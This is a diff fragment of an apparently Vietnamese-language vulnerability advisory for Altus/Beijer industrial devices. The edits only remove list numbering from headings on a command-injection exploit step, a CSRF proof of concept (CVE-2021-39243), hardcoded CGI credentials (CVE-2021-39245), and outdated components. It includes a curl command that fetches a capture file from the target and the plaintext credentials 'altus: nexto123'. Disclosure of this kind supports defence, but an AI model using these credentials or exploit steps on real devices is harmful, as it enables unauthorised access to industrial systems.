@@ -111,7 +111,7 @@ echo -e "Executed \"$CMD\".\nResponse:"
 curl -s -k -X "GET" -H "Host: $TARGET_HOST" "http://$TARGET_HOST/capture.pcap"
 ```
 
-2. Truy vấn yêu cầu trên nhiều trang web (CSRF) (CVE-2021-39243) Chứng minh khái niệm CSRF sau đây có thể được sử dụng để thực hiện bước đầu tiên của khai thác lệnh Injection:
+Truy vấn yêu cầu trên nhiều trang web (CSRF) (CVE-2021-39243) Chứng minh khái niệm CSRF sau đây có thể được sử dụng để thực hiện bước đầu tiên của khai thác lệnh Injection:
 
 ```html
 <html>
@@ -127,7 +127,7 @@ curl -s -k -X "GET" -H "Host: $TARGET_HOST" "http://$TARGET_HOST/capture.pcap"
 </html>
 ```
 
-3. Thông tin đăng nhập được mã hóa cứng cho Điểm cuối CGI (CVE-2021-39245) Thông tin xác thực được mã hóa cứng có trong "/etc/lighttpd/lighttpd-auth.conf": altus: nexto123
+Thông tin đăng nhập được mã hóa cứng cho Điểm cuối CGI (CVE-2021-39245) Thông tin xác thực được mã hóa cứng có trong "/etc/lighttpd/lighttpd-auth.conf": altus: nexto123
 
 Các thông tin xác thực này được sử dụng riêng cho tập lệnh getlogs.cgi. Đây cũng là được mô tả trong lighttpd.conf nằm trong cùng một thư mục:
 
@@ -145,7 +145,7 @@ auth.require = ( "/cgi/getlogs.cgi" =>
 )
 ```
 
-4. Các thành phần phần mềm lỗi thời và dễ bị tổn thương Dựa trên quá trình quét tự động với Trình kiểm tra IoT của bên thứ ba sau gói phần mềm đã lỗi thời:
+Các thành phần phần mềm lỗi thời và dễ bị tổn thương Dựa trên quá trình quét tự động với Trình kiểm tra IoT của bên thứ ba sau gói phần mềm đã lỗi thời:
 
 ```powershell
 Altus/Beijer XP3xx:
